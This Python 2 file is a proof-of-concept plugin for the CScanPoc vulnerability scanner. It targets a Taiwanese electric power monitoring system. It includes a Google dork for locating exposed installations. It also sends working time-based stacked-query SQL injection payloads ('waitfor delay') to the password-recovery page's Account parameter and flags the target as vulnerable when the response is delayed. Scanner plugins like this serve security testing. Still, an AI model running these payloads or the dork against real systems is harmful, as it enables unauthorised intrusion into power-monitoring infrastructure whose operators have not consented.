# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse
import time


class Vuln(ABVuln):
    vuln_id = 'Electric_Monitor_0004'  # 平台漏洞编号，留空
    name = '台湾某电力监控系统通用型注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-23'  # 漏洞公布时间
    desc = '''
        台湾某电力监控系统通用型注入漏洞。
        google dork:"智慧型電能監控管理系統"
        http://foorbar/ForgotPassword/MailPassword.aspx?System= Parameter: Account (POST)
        type: stacked queries
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '电力监控系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a4f8382c-6d87-4808-a7e8-2b1fc8398230'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2010-0102622
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/ForgotPassword/MailPassword.aspx?System='
            post_wait_0 = 'Account=admin%27;waitfor%20delay%20%270:0:0%27--&mail=admin&send=%E5%AF%84%E5%87%BA'
            post_wait_5 = 'Account=admin%27;waitfor%20delay%20%270:0:5%27--&mail=admin&send=%E5%AF%84%E5%87%BA'
            content_type = 'Content-Type: application/x-www-form-urlencoded'

            t0 = time.time()
            code1, head, res, err, _ = hh.http(
                url, post=post_wait_0, header=content_type)
            t_0 = time.time()-t0
            if code1 == 0:
                return False
            t5 = time.time()
            code2, head, res, err, _ = hh.http(
                url, post=post_wait_5, header=content_type)
            t_5 = time.time()-t5
            if code2 == 0:
                return False
            if code1 == 200 and code2 == 200 and t_5 > 5 and t_0 < 2:
                #security_hole('SQL injection: ' + url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
